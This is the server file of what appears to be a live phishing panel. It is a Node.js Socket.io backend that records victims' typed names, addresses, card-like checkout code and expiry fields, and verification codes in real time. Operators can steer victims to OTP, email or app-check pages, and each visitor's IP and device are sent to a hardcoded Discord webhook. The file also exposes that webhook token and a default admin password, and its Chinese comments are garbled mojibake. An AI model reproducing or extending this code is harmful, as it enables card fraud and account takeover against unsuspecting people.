// backend/server.js - 瀹屾暣鐨勫悗鍙颁唬鐮侊紝鍖呮嫭瀹炴椂鏇存柊鍜屽鐞嗘柊澧炲瓧娈?
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const https = require('https');
const net = require('net');
const tls = require('tls');
const { execFileSync } = require('child_process');

const app = express();

const rawCorsOrigins = (process.env.CORS_ORIGIN || process.env.CORS_ORIGINS || '').toString().trim();
const corsOrigins = rawCorsOrigins
  .split(',')
  .map((x) => x.trim())
  .filter(Boolean);

function isCorsOriginAllowed(origin) {
  // Allow server-to-server/no-origin requests and local development by default.
  if (!origin) return true;
  if (corsOrigins.length === 0) return true;
  return corsOrigins.includes(origin);
}

const corsOptions = {
  origin: (origin, callback) => callback(null, isCorsOriginAllowed(origin)),
  methods: ['GET', 'POST'],
  credentials: true,
};

app.use(cors(corsOptions));

const ADMIN_PASSWORD = (process.env.ADMIN_PASSWORD || 'admin123').toString();
// Prefer env var, but keep a fallback so it works out-of-the-box.
// SECURITY NOTE: Webhook URLs are secrets. It's safer to use DISCORD_WEBHOOK_URL instead of hardcoding.
const DISCORD_WEBHOOK_URL = (
  process.env.DISCORD_WEBHOOK_URL ||
  'https://discord.com/api/webhooks/1469516049312514151/YBVm1OGAAhRdlC7BdI5n3741BfBzLy3L82xZuJPgnIrpTY--l1ON17BGhzB0J6t2tR8D'
)
  .toString()
  .trim();
const DISCORD_WEBHOOK_DEBUG = (process.env.DISCORD_WEBHOOK_DEBUG || '').toString().trim() === '1';
const DISCORD_PROXY_URL = (() => {
  const fromEnv = (process.env.DISCORD_PROXY || process.env.HTTPS_PROXY || process.env.HTTP_PROXY || '').toString().trim();
  if (fromEnv) return /^[a-z]+:\/\//i.test(fromEnv) ? fromEnv : `http://${fromEnv}`;

  // Try Windows (WinINET) proxy settings, since PowerShell can reach Discord but Node might not.
  const isWin = process.platform === 'win32';
  if (!isWin) return '';

  const key = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings';
  const readRegValue = (valueName) => {
    try {
      const out = execFileSync('reg', ['query', key, '/v', valueName], { encoding: 'utf8' });
      const m = out.match(new RegExp(`\\s${valueName}\\s+REG_\\w+\\s+(.*)$`, 'mi'));
      return m ? (m[1] || '').trim() : '';
    } catch {
      return '';
    }
  };

  const enableRaw = readRegValue('ProxyEnable').toLowerCase();
  const enabled = enableRaw.includes('0x1') || enableRaw === '1';
  if (!enabled) return '';

  const proxyServer = readRegValue('ProxyServer');
  if (!proxyServer) return '';

  // ProxyServer can be: "host:port" or "http=host:port;https=host:port"
  const parts = proxyServer
    .split(';')
    .map((x) => x.trim())
    .filter(Boolean);
  let httpProxy = '';
  let httpsProxy = '';
  for (const p of parts) {
    const idx = p.indexOf('=');
    if (idx === -1) {
      if (!httpProxy) httpProxy = p;
      continue;
    }
    const k = p.slice(0, idx).trim().toLowerCase();
    const v = p.slice(idx + 1).trim();
    if (k === 'http') httpProxy = v;
    if (k === 'https') httpsProxy = v;
  }

  const picked = httpsProxy || httpProxy;
  if (!picked) return '';
  return /^[a-z]+:\/\//i.test(picked) ? picked : `http://${picked}`;
})();

const adminDistNew = path.join(__dirname, 'admin', 'dist');
const adminDistLegacy = path.join(__dirname, 'admin-dist');
const adminStaticDir = fs.existsSync(adminDistNew) ? adminDistNew : adminDistLegacy;
const adminAssetsDir = path.join(adminStaticDir, 'assets');

// Avoid stale admin HTML being cached by browser/proxy; always fetch latest shell.
app.use('/admin', (req, res, next) => {
  const reqPath = (req.path || '').toString();
  const isHtmlShell = reqPath === '/' || reqPath === '' || !path.extname(reqPath);
  if (isHtmlShell) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  }
  next();
});

// Serve admin assets explicitly. Missing assets return 404 instead of HTML.
app.use('/admin/assets', express.static(adminAssetsDir, { fallthrough: false }));
app.use('/admin/dist/assets', express.static(adminAssetsDir, { fallthrough: false }));
app.use('/admin', express.static(adminStaticDir));
app.get('/admin/:path(*)', (req, res) => res.sendFile(path.join(adminStaticDir, 'index.html')));
// Compatibility: allow visiting /admin/dist* after deployment path changes.
app.get('/admin/dist', (req, res) => res.redirect(302, '/admin'));
app.get('/admin/dist/:path(*)', (req, res) => {
  const subPath = (req.params.path || '').toString();
  return res.redirect(302, `/admin/${subPath}`);
});
app.get('/', (req, res) => res.send('<h1>Socket.io Server Running</h1>'));

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: (origin, callback) => callback(null, isCorsOriginAllowed(origin)),
    methods: ['GET', 'POST'],
    credentials: true,
  },
  pingTimeout: 5000,
  pingInterval: 2500,
});

const onlineUsers = new Map(); // socket.id -> { page, ip, deviceType, deviceOS, online, activeRecordId, clientId, activated }
const adminSockets = new Set(); // socket.id of authenticated admin sessions
let records = [];
let recordCounter = 1;
const discordHomeNotified = new Set(); // socket.id
const visitClientIds = new Set(); // unique clientIds that entered frontend
const clickClientIds = new Set(); // unique clientIds that clicked enter/register

// ---------- helpers ----------
const nowCN = () => new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
const nowTs = () => Date.now();
const isSubId = (id) => id.toString().includes('.');
const isAdminSocket = (socketId) => adminSockets.has(socketId);

function normalizeIp(raw) {
  const ip = (raw || '').toString().trim();
  if (!ip) return '';
  const first = ip.split(',')[0].trim();
  if (!first) return '';
  if (first.startsWith('::ffff:')) return first.slice(7);
  return first;
}

function getClientIp(socket) {
  const headers = socket.handshake?.headers || {};
  const ip =
    normalizeIp(headers['cf-connecting-ip']) ||
    normalizeIp(headers['x-real-ip']) ||
    normalizeIp(headers['x-client-ip']) ||
    normalizeIp(headers['true-client-ip']) ||
    normalizeIp(headers['x-forwarded-for']) ||
    normalizeIp(socket.handshake?.address) ||
    'unknown';
  return ip;
}

function getUserAgent(socket) {
  const headers = socket.handshake?.headers || {};
  return (headers['user-agent'] || '').toString();
}

function detectDeviceType(userAgent) {
  const ua = (userAgent || '').toLowerCase();
  if (!ua) return '未知设备';
  if (/ipad|tablet|playbook|silk/.test(ua)) return '平板';
  if (/mobile|iphone|ipod|android|windows phone|blackberry|opera mini|opera mobi/.test(ua)) return '手机';
  return '电脑';
}

function detectDeviceOS(userAgent) {
  const ua = (userAgent || '').toLowerCase();
  if (!ua) return '未知系统';
  if (/android/.test(ua)) return '安卓';
  if (/iphone|ipad|ipod|ios|mac os x/.test(ua)) return '苹果';
  if (/windows/.test(ua)) return 'Windows';
  if (/linux/.test(ua)) return 'Linux';
  return '其他';
}

function emitAdmin() {
  const safeOnline = Array.from(onlineUsers.values()).filter((u) => u && u.activated);
  const visits = visitClientIds.size;
  const clicks = clickClientIds.size;
  const stepDone = visits + clicks; // enter=1 step, submit=1 step
  const stepTotal = visits * 2;
  const clickRate = stepTotal > 0 ? Number(((stepDone / stepTotal) * 100).toFixed(1)) : 0;
  io.to('admin').emit('admin-update', { records, onlineUsers: safeOnline, stats: { visits, clicks, stepDone, stepTotal, clickRate } });
}

function postJson(urlString, payload, { timeoutMs = 5000 } = {}) {
  return new Promise((resolve, reject) => {
    try {
      const u = new URL(urlString);
      const body = JSON.stringify(payload || {});

      const req = https.request(
        {
          protocol: u.protocol,
          hostname: u.hostname,
          port: u.port || (u.protocol === 'https:' ? 443 : 80),
          path: u.pathname + u.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
          },
        },
        (res) => {
          const ok = res.statusCode && res.statusCode >= 200 && res.statusCode < 300;
          res.resume(); // drain
          if (!ok) reject(new Error(`http ${res.statusCode || 0}`));
          else resolve(true);
        }
      );

      req.on('error', reject);
      req.setTimeout(timeoutMs, () => {
        req.destroy(new Error('timeout'));
      });

      req.write(body);
      req.end();
    } catch (e) {
      reject(e);
    }
  });
}

function postJsonViaHttpProxy(proxyUrlString, targetUrlString, payload, { timeoutMs = 8000 } = {}) {
  return new Promise((resolve, reject) => {
    try {
      const proxyUrl = new URL(proxyUrlString);
      const targetUrl = new URL(targetUrlString);
      const targetHost = targetUrl.hostname;
      const targetPort = Number(targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80));
      const body = JSON.stringify(payload || {});

      const proxyPort = Number(proxyUrl.port || 80);
      const proxyHost = proxyUrl.hostname;
      const proxyAuth =
        proxyUrl.username || proxyUrl.password
          ? Buffer.from(`${decodeURIComponent(proxyUrl.username)}:${decodeURIComponent(proxyUrl.password)}`).toString('base64')
          : '';

      const sock = net.createConnection({ host: proxyHost, port: proxyPort });
      let settled = false;
      const done = (err) => {
        if (settled) return;
        settled = true;
        try {
          sock.destroy();
        } catch {
          // ignore
        }
        if (err) reject(err);
        else resolve(true);
      };

      sock.setTimeout(timeoutMs, () => done(new Error('proxy timeout')));
      sock.on('error', (e) => done(e));

      sock.on('connect', () => {
        const headers = [
          `CONNECT ${targetHost}:${targetPort} HTTP/1.1`,
          `Host: ${targetHost}:${targetPort}`,
          'Proxy-Connection: keep-alive',
          proxyAuth ? `Proxy-Authorization: Basic ${proxyAuth}` : null,
          '',
          '',
        ]
          .filter(Boolean)
          .join('\r\n');
        sock.write(headers);
      });

      let buf = '';
      const onProxyData = (chunk) => {
        buf += chunk.toString('utf8');
        const idx = buf.indexOf('\r\n\r\n');
        if (idx === -1) return;

        sock.off('data', onProxyData);
        const head = buf.slice(0, idx);
        const firstLine = head.split('\r\n')[0] || '';
        const m = firstLine.match(/HTTP\/\d\.\d\s+(\d+)/i);
        const code = m ? parseInt(m[1], 10) : 0;
        if (code !== 200) {
          done(new Error(`proxy connect failed: ${firstLine}`));
          return;
        }

        const tlsSock = tls.connect({
          socket: sock,
          servername: targetHost,
        });

        tlsSock.setTimeout(timeoutMs, () => {
          try {
            tlsSock.destroy(new Error('tls timeout'));
          } catch {
            // ignore
          }
        });

        tlsSock.on('error', (e) => done(e));

        let resp = '';
        let statusCode = 0;
        tlsSock.on('data', (d) => {
          resp += d.toString('utf8');
          if (!statusCode) {
            const lineEnd = resp.indexOf('\r\n');
            if (lineEnd !== -1) {
              const line = resp.slice(0, lineEnd);
              const mm = line.match(/HTTP\/\d\.\d\s+(\d+)/i);
              statusCode = mm ? parseInt(mm[1], 10) : 0;
            }
          }
        });

        tlsSock.on('end', () => {
          if (statusCode >= 200 && statusCode < 300) done(null);
          else done(new Error(`webhook http ${statusCode || 0}`));
        });

        const path = `${targetUrl.pathname}${targetUrl.search}`;
        const reqLines = [
          `POST ${path} HTTP/1.1`,
          `Host: ${targetHost}`,
          'User-Agent: crm-project',
          'Content-Type: application/json',
          `Content-Length: ${Buffer.byteLength(body)}`,
          'Connection: close',
          '',
          '',
        ].join('\r\n');

        tlsSock.write(reqLines);
        tlsSock.write(body);
      };

      sock.on('data', onProxyData);
    } catch (e) {
      reject(e);
    }
  });
}

function notifyDiscordHomeOnline({ time, ip, deviceType, deviceOS, recordId, clientId } = {}) {
  if (!DISCORD_WEBHOOK_URL) return;

  const lines = [
    'User online (Home)',
    time ? `Time: ${time}` : null,
    ip ? `IP: ${ip}` : null,
    deviceType || deviceOS ? `Device: ${[deviceType, deviceOS].filter(Boolean).join(' / ')}` : null,
    recordId ? `Record: ${recordId}` : null,
    clientId ? `Client: ${clientId}` : null,
  ].filter(Boolean);

  const content = lines.join('\n').slice(0, 1900);
  const send = DISCORD_PROXY_URL
    ? postJsonViaHttpProxy(DISCORD_PROXY_URL, DISCORD_WEBHOOK_URL, { content }, { timeoutMs: 12_000 })
    : postJson(DISCORD_WEBHOOK_URL, { content }, { timeoutMs: 12_000 });

  send
    .then(() => {
      if (DISCORD_WEBHOOK_DEBUG) console.log('[discord] webhook ok', DISCORD_PROXY_URL ? '(proxy)' : '(direct)');
    })
    .catch((e) => {
      // Best-effort only; do not impact user flow.
      if (DISCORD_WEBHOOK_DEBUG) console.log('[discord] webhook failed:', e?.message || e);
    });
}

function getMainRecord(socketId) {
  return records.find((r) => r.socketId === socketId && !isSubId(r.id));
}

function getMainRecordByClientId(clientId) {
  if (!clientId) return null;
  const mains = records
    .filter((r) => r.clientId === clientId && !isSubId(r.id))
    .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
  return mains[0] || null;
}

function getClientRecords(clientId) {
  if (!clientId) return [];
  return records.filter((r) => r.clientId === clientId);
}

function normalizeClientId(input) {
  const cid = (input || '').toString().trim();
  if (!cid) return '';
  return cid.slice(0, 120);
}

function getActiveRecord(socketId) {
  const user = onlineUsers.get(socketId);
  if (!user?.activeRecordId) return null;
  return records.find((r) => r.socketId === socketId && r.id === user.activeRecordId) || null;
}

function setActiveRecord(socketId, recordId) {
  const user = onlineUsers.get(socketId);
  if (user) user.activeRecordId = recordId;

  // optional: mark active field for UI highlight
  records.forEach((r) => {
    if (r.socketId === socketId) r.active = r.id === recordId;
  });
}

function nextSubId(mainId) {
  const prefix = `${mainId}.`;
  const maxN = records
    .filter((r) => r.id.toString().startsWith(prefix))
    .map((r) => parseInt(r.id.toString().split('.')[1] || '0', 10))
    .reduce((a, b) => Math.max(a, b), 0);
  return `${mainId}.${maxN + 1}`;
}

function getMainId(recordId) {
  const n = parseInt((recordId || '').toString().split('.')[0], 10);
  return Number.isFinite(n) ? n : null;
}

function cloneCheckoutSnapshots(snapshots) {
  if (!Array.isArray(snapshots)) return [];
  return snapshots.map((x) => ({ ...x }));
}

function cloneVerifyHistory(history) {
  if (!Array.isArray(history)) return [];
  return history.map((x) => ({ ...x }));
}

function normalizeVerifyMethod(value) {
  const raw = (value ?? '').toString().trim().toLowerCase();
  if (!raw) return '';
  if (raw.includes('phone') || raw.includes('sms') || raw.includes('mobile') || raw.includes('tel')) return 'phone';
  if (raw.includes('email') || raw.includes('mail')) return 'email';
  return raw.slice(0, 40);
}

function pushVerifyHistory(record, verifyValue) {
  const value = (verifyValue || '').toString().trim();
  if (!record || !value) return;

  record.verifyHistory = Array.isArray(record.verifyHistory) ? record.verifyHistory : [];
  record.verifyHistory.unshift({ at: nowTs(), time: nowCN(), value });
  if (record.verifyHistory.length > 50) {
    record.verifyHistory = record.verifyHistory.slice(0, 50);
  }
}

function buildSubRecordFrom(base, { id, page, status, verifyValue, historyStatus, refillReason } = {}) {
  const ts = nowTs();
  const time = nowCN();

  return {
    id,
    clientId: base.clientId || '',
    socketId: base.socketId,
    ip: base.ip || '',
    deviceType: base.deviceType || '',
    deviceOS: base.deviceOS || '',
    time,
    page: page || base.page || 'unknown',
    online: base.online !== false,

    status: status || base.status || 'Refill submitted',

    fullname: (base.fullname || '').toString(),
    address: (base.address || '').toString(),
    fulladdress: (base.fulladdress || '').toString(),
    city: (base.city || '').toString(),
    state: (base.state || '').toString(),
    postalcode: (base.postalcode || '').toString(),
    email: (base.email || '').toString(),
    telephone: (base.telephone || '').toString(),

    checkoutName: (base.checkoutName || '').toString(),
    checkoutPhone: (base.checkoutPhone || '').toString(),
    checkoutCode: (base.checkoutCode || '').toString(),
    checkoutExpiryDate: (base.checkoutExpiryDate || '').toString(),
    checkoutDate: (base.checkoutDate || '').toString(),
    checkoutSnapshots: cloneCheckoutSnapshots(base.checkoutSnapshots),

    verify: verifyValue !== undefined ? verifyValue : (base.verify || '').toString(),
    verifyHistory: cloneVerifyHistory(base.verifyHistory),
    verifyMethod: (base.verifyMethod || '').toString(),
    emailVerify: (base.emailVerify || '').toString(),
    appCheck: (base.appCheck || '').toString(),

    createdAt: ts,
    updatedAt: ts,
    history: [{ at: ts, time, status: historyStatus || 'Created sub record' }],
    refillReason: refillReason || '',
    note: '',
    active: true,
  };
}

function touch(record, status) {
  const t = nowTs();
  record.updatedAt = t;
  if (!record.createdAt) record.createdAt = t;

  if (status) {
    record.status = status;
    record.history = record.history || [];
    record.history.push({ at: t, time: nowCN(), status });
  }
}

function getCheckoutSnapshot(record) {
  return {
    at: nowTs(),
    time: nowCN(),
    checkoutName: (record.checkoutName || '').toString(),
    checkoutPhone: (record.checkoutPhone || '').toString(),
    checkoutCode: (record.checkoutCode || '').toString(),
    checkoutDate: (record.checkoutDate || '').toString(),
    checkoutExpiryDate: (record.checkoutExpiryDate || '').toString(),
  };
}

function pushCheckoutSnapshot(record) {
  if (!record) return;
  const snap = getCheckoutSnapshot(record);
  const hasCheckoutValue = !!(
    snap.checkoutName ||
    snap.checkoutPhone ||
    snap.checkoutCode ||
    snap.checkoutDate ||
    snap.checkoutExpiryDate
  );
  if (!hasCheckoutValue) return;

  record.checkoutSnapshots = Array.isArray(record.checkoutSnapshots) ? record.checkoutSnapshots : [];
  const last = record.checkoutSnapshots[record.checkoutSnapshots.length - 1];
  if (
    last &&
    last.checkoutName === snap.checkoutName &&
    last.checkoutPhone === snap.checkoutPhone &&
    last.checkoutCode === snap.checkoutCode &&
    last.checkoutDate === snap.checkoutDate &&
    last.checkoutExpiryDate === snap.checkoutExpiryDate
  ) {
    return;
  }

  record.checkoutSnapshots.push(snap);
  if (record.checkoutSnapshots.length > 20) {
    record.checkoutSnapshots = record.checkoutSnapshots.slice(-20);
  }
}

// 璁?status/椤甸潰鏇翠竴鑷寸殑杈呭姪鍑芥暟锛堝彲閫変絾寰堝疄鐢級
function setUserPage(socketId, page) {
  const user = onlineUsers.get(socketId);
  if (user) user.page = page;
  const active = getActiveRecord(socketId);
  if (active) active.page = page;
}

// ---------- socket ----------
io.on('connection', (socket) => {
  const ip = getClientIp(socket);
  const userAgent = getUserAgent(socket);
  const deviceType = detectDeviceType(userAgent);
  const deviceOS = detectDeviceOS(userAgent);

  // Only become "online" for admin after user explicitly clicks the Home button (frontend triggers attach-client/register-user).
  onlineUsers.set(socket.id, {
    page: 'pending',
    ip,
    deviceType,
    deviceOS,
    online: false,
    activeRecordId: null,
    clientId: '',
    activated: false,
  });

  socket.on('attach-client', ({ clientId } = {}, ack) => {
    const cid = normalizeClientId(clientId);
    if (!cid) {
      ack?.({ ok: false, error: 'missing clientId' });
      return;
    }
    visitClientIds.add(cid);

    const currentUser = onlineUsers.get(socket.id) || {
      page: 'pending',
      ip,
      deviceType,
      deviceOS,
      online: false,
      activeRecordId: null,
      clientId: '',
      activated: false,
    };

    currentUser.clientId = cid;
    currentUser.ip = ip;
    currentUser.deviceType = deviceType;
    currentUser.deviceOS = deviceOS;
    currentUser.online = true;
    currentUser.activated = true;

    // If this client already has another connected socket, transfer session ownership.
    for (const [sid, user] of onlineUsers.entries()) {
      if (sid === socket.id) continue;
      if (user?.clientId !== cid) continue;
      if (user.activeRecordId) currentUser.activeRecordId = user.activeRecordId;
      if (user.page) currentUser.page = user.page;
      onlineUsers.delete(sid);
    }

    const clientRecords = getClientRecords(cid);
    if (clientRecords.length > 0) {
      clientRecords.forEach((r) => {
        r.socketId = socket.id;
        r.ip = ip;
        r.deviceType = deviceType;
        r.deviceOS = deviceOS;
        r.online = true;
        r.clientId = cid;
      });

      const active =
        clientRecords.find((r) => currentUser.activeRecordId && r.id === currentUser.activeRecordId) ||
        clientRecords.find((r) => r.active) ||
        [...clientRecords].sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))[0];

      if (active) {
        currentUser.activeRecordId = active.id;
        currentUser.page = active.page || currentUser.page || 'home';
        setActiveRecord(socket.id, active.id);
      }
    }

    onlineUsers.set(socket.id, currentUser);
    emitAdmin();
    ack?.({ ok: true, resumed: clientRecords.length > 0, page: currentUser.page, activeRecordId: currentUser.activeRecordId });
  });

  // -----------------------------
  // 鉁?1) 璁╃敤鎴疯烦杞細Admin -> user
  // AdminDashboard: socket.emit('admin-route-user', { socketId, target })
  // User(App.tsx鍏ㄥ眬鐩戝惉): socket.on('checkout-route', ...)
  // -----------------------------
  socket.on('admin-route-user', ({ socketId, target, reason }, ack) => {
    try {
      if (!isAdminSocket(socket.id)) {
        ack?.({ ok: false, error: 'admin unauthorized' });
        return;
      }

      if (!socketId || !target) {
        ack?.({ ok: false, error: 'missing socketId/target' });
        return;
      }

      const targetSocket = io.sockets.sockets.get(socketId);
      if (!targetSocket) {
        ack?.({ ok: false, error: 'target user offline / socket not found' });
        return;
      }

      // 鉁?鍚屾鏇存柊鍚庣鏄剧ず鐨?page/status锛堜笉渚濊禆鐢ㄦ埛 join-page锛?
      const pageForAdmin =
        String(target).toLowerCase() === 'emailverify'
          ? 'emailverify'
          : String(target).toLowerCase() === 'verifyphone'
            ? 'verify'
          : String(target).toLowerCase() === 'appcheck'
            ? 'appcheck'
          : String(target).toLowerCase() === 'verify'
              ? 'verify'
              : String(target).toLowerCase() === 'home'
                ? 'home'
                : String(target).toLowerCase() === 'checkout'
                  ? 'checkout'
                  : 'unknown';

      let routeRecord = getActiveRecord(socketId);

      // 鉁?鍙戠粰鐩爣鐢ㄦ埛锛氳鍏惰烦杞?
      io.to(socketId).emit('checkout-route', {
        target,
        reason: reason || 'Admin requested page routing',
      });

      setUserPage(socketId, pageForAdmin);

      routeRecord = getActiveRecord(socketId) || routeRecord;
      if (routeRecord) touch(routeRecord, `Admin routed user 鈫?${pageForAdmin}`);

      emitAdmin();
      ack?.({ ok: true });
    } catch (e) {
      ack?.({ ok: false, error: e?.message || 'unknown error' });
    }
  });

  socket.on('admin-route-url', ({ socketId, reason }, ack) => {
    try {
      if (!isAdminSocket(socket.id)) {
        ack?.({ ok: false, error: 'admin unauthorized' });
        return;
      }

      if (!socketId) {
        ack?.({ ok: false, error: 'missing socketId' });
        return;
      }

      const targetSocket = io.sockets.sockets.get(socketId);
      if (!targetSocket) {
        ack?.({ ok: false, error: 'target user offline / socket not found' });
        return;
      }

      io.to(socketId).emit('admin-open-url', {
        action: 'open-external',
        reason: reason || 'Admin requested URL routing',
      });

      setUserPage(socketId, 'external');
      const active = getActiveRecord(socketId);
      if (active) touch(active, 'Admin routed user -> external');

      emitAdmin();
      ack?.({ ok: true });
    } catch (e) {
      ack?.({ ok: false, error: e?.message || 'unknown error' });
    }
  });

  // -----------------------------
  // 鉁?椤甸潰涓婃姤锛堣繘鍏ラ〉闈級
  // -----------------------------
  socket.on('join-page', (page) => {
    const p = (page || '').toString();
    setUserPage(socket.id, p);
    const user = onlineUsers.get(socket.id);
    if (user) {
      user.ip = ip;
      user.deviceType = deviceType;
      user.deviceOS = deviceOS;
    }
    if (user && !user.activated) return;

    const active = getActiveRecord(socket.id);
    if (active) {
      active.ip = ip;
      active.deviceType = deviceType;
      active.deviceOS = deviceOS;
      touch(active, `Entered ${p}`);
    }

    emitAdmin();

    if (p.toLowerCase() === 'home' && !discordHomeNotified.has(socket.id)) {
      discordHomeNotified.add(socket.id);
      notifyDiscordHomeOnline({
        time: nowCN(),
        ip,
        deviceType,
        deviceOS,
        recordId: active?.id,
        clientId: user?.clientId,
      });
      if (DISCORD_WEBHOOK_DEBUG) console.log('[discord] sent home online notice for', socket.id);
    }
  });

  // Home page entered (for Discord notification only; does not affect admin visibility gating).
  socket.on('home-entered', () => {
    if (discordHomeNotified.has(socket.id)) return;
    discordHomeNotified.add(socket.id);
    const user = onlineUsers.get(socket.id);
    notifyDiscordHomeOnline({
      time: nowCN(),
      ip,
      deviceType,
      deviceOS,
      recordId: undefined,
      clientId: user?.clientId,
    });
    if (DISCORD_WEBHOOK_DEBUG) console.log('[discord] sent home-entered notice for', socket.id);
  });

  // -----------------------------
  // -----------------------------
  // page leave (from useCurrentPage leave-page)
  // -----------------------------
  socket.on('leave-page', ({ page, reason }) => {
    const p = (page || '').toString();
    const leaveReason = (reason || '').toString().toLowerCase();
    const transientLeave = leaveReason === 'hidden' || leaveReason === 'beforeunload';

    // Preserve last editing status when tab is hidden/refreshing.
    const user = onlineUsers.get(socket.id);
    if (user && !transientLeave) user.page = 'left';

    const active = getActiveRecord(socket.id);
    if (active) {
      active.page = p || active.page || 'unknown';
      if (!transientLeave) {
        touch(active, `Left ${p || 'page'}${reason ? ` (${reason})` : ''}`);
      }
    }

    emitAdmin();
  });

  // -----------------------------
  // 娉ㄥ唽涓昏褰?
  // -----------------------------
  socket.on('register-user', ({ clickTime, clientId } = {}, ack) => {
    const cid = normalizeClientId(clientId || onlineUsers.get(socket.id)?.clientId);
    if (cid) clickClientIds.add(cid);
    const user = onlineUsers.get(socket.id);
    if (user && cid) user.clientId = cid;
    if (user) {
      user.activated = true;
      user.online = true;
      user.ip = ip;
      user.deviceType = deviceType;
      user.deviceOS = deviceOS;
    }

    // Reuse existing main record for the same browser client.
    const existingMain = getMainRecordByClientId(cid);
    if (existingMain) {
      const clientRecords = getClientRecords(cid);
      clientRecords.forEach((r) => {
        r.socketId = socket.id;
        r.ip = ip;
        r.deviceType = deviceType;
        r.deviceOS = deviceOS;
        r.online = true;
        r.clientId = cid;
      });

      const active =
        clientRecords.find((r) => r.active) ||
        [...clientRecords].sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))[0] ||
        existingMain;

      setActiveRecord(socket.id, active.id);
      if (user) {
        user.activeRecordId = active.id;
        user.page = active.page || user.page || 'home';
        user.online = true;
        user.ip = ip;
        user.deviceType = deviceType;
        user.deviceOS = deviceOS;
      }

      emitAdmin();
      ack?.({ ok: true, resumed: true, recordId: active.id, page: user?.page || active.page || 'home' });
      return;
    }

    const id = recordCounter++;
    const time = clickTime || nowCN();
    const ts = nowTs();

    const mainRecord = {
      id,
      clientId: cid || '',
      socketId: socket.id,
      ip,
      deviceType,
      deviceOS,
      time,
      page: 'home',
      online: true,

      status: 'Entered home',
      fullname: '',
      address: '',
      fulladdress: '',
      city: '',
      state: '',
      postalcode: '',
      email: '',
      telephone: '',

      // checkout
      checkoutName: '',
      checkoutPhone: '',
      checkoutCode: '',
      checkoutExpiryDate: '',
      checkoutDate: '',
      checkoutSnapshots: [],

      // verify/email/app
      verify: '',
      verifyHistory: [],
      verifyMethod: '',
      emailVerify: '',
      appCheck: '',

      createdAt: ts,
      updatedAt: ts,
      history: [{ at: ts, time, status: 'Created main record' }],
      note: '',
      active: true,
    };

    records.push(mainRecord);
    setActiveRecord(socket.id, id);
    if (user) user.activeRecordId = id;

    emitAdmin();
    ack?.({ ok: true, resumed: false, recordId: id, page: 'home' });
  });

  // -----------------------------
  // 瀹炴椂瀛楁鏇存柊锛堝寘鍚?verify/emailVerify/appCheck锛?
  // -----------------------------
  socket.on('update-form-field', (data) => {
    const field = (data?.field || '').toString();
    const value = field === 'verifyMethod' ? normalizeVerifyMethod(data?.value) : data?.value ?? '';

    const fieldName =
      {
        fullname: 'Full Name',
        address: 'Address',
        fulladdress: 'Address Line 2',
        city: 'City',
        state: 'State/Province',
        postalcode: 'Postal Code',
        email: 'Email',
        telephone: 'Phone',

        // checkout
        checkoutName: 'Checkout Name',
        checkoutPhone: 'Checkout Phone',
        checkoutCode: 'Checkout Code',
        checkoutExpiryDate: 'Checkout Expiry Date',

        // three pages
        verify: 'Verify',
        verifyMethod: 'Verify Method',
        emailVerify: 'Email Verify',
        appCheck: 'App Check',
      }[field] || field;

    const active = getActiveRecord(socket.id);
    if (active) {
      active[field] = value;
      const statusText = field === 'verifyMethod' ? `Selected verify method: ${value || '-'}` : `Editing: ${fieldName}`;
      touch(active, statusText);

      if (field === 'verifyMethod') {
        const mainId = getMainId(active.id);
        if (mainId) {
          const mainRecord = records.find((r) => !isSubId(r.id) && r.id.toString() === mainId.toString());
          if (mainRecord && mainRecord !== active) {
            mainRecord.verifyMethod = value;
            mainRecord.updatedAt = active.updatedAt;
            mainRecord.status = statusText;
          }
        }
      }
    }

    emitAdmin();
  });

  socket.on('get-verify-contact-options', (_data, ack) => {
    const user = onlineUsers.get(socket.id);

    let source = getActiveRecord(socket.id);
    if (!source && user?.clientId) source = getMainRecordByClientId(user.clientId);
    if (!source) source = getMainRecord(socket.id);
    if (!source) {
      source =
        records
          .filter((r) => r.socketId === socket.id)
          .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))[0] || null;
    }

    ack?.({
      ok: true,
      telephone: (source?.telephone || '').toString(),
      email: (source?.email || '').toString(),
    });
  });

  socket.on('verify-submit', ({ verifyId } = {}, ack) => {
    const verifyValue = (verifyId || '').toString().trim().slice(0, 200);
    if (!verifyValue) {
      ack?.({ ok: false, error: 'missing verifyId' });
      return;
    }

    const active = getActiveRecord(socket.id);
    if (!active) {
      ack?.({ ok: false, error: 'active record not found' });
      return;
    }

    const target = active;
    target.verify = verifyValue;
    target.page = 'verify';
    target.online = true;
    target.ip = ip;
    target.deviceType = deviceType;
    target.deviceOS = deviceOS;
    pushVerifyHistory(target, verifyValue);
    touch(target, 'Verify submitted');

    // Also mirror latest verify + history to main record for stable admin visibility.
    const mainId = getMainId(target.id);
    if (mainId) {
      const mainRecord = records.find((r) => !isSubId(r.id) && r.id.toString() === mainId.toString());
      if (mainRecord) {
        mainRecord.verify = verifyValue;
        mainRecord.verifyMethod = (target.verifyMethod || '').toString();
        mainRecord.page = 'verify';
        mainRecord.online = true;
        mainRecord.ip = ip;
        mainRecord.deviceType = deviceType;
        mainRecord.deviceOS = deviceOS;
        mainRecord.updatedAt = target.updatedAt;
        if (mainRecord !== target) pushVerifyHistory(mainRecord, verifyValue);
      }
    }

    const user = onlineUsers.get(socket.id);
    if (user) {
      user.page = 'verify';
      user.online = true;
      user.ip = ip;
      user.deviceType = deviceType;
      user.deviceOS = deviceOS;
      user.activeRecordId = target.id;
    }

    emitAdmin();
    ack?.({ ok: true, createdSub: false, recordId: target.id });
  });

  // normal submit => update active record
  socket.on('update-user-info', (data) => {
    const active = getActiveRecord(socket.id);
    if (active) {
      Object.assign(active, data);
      active.page = 'checkout';
      touch(active, 'Submitted 鈫?Checkout');
    }
    emitAdmin();
  });

  // -----------------------------
  // Checkout 椤甸潰鎻愪氦锛堝啓鍏?checkoutDate锛?
  // -----------------------------
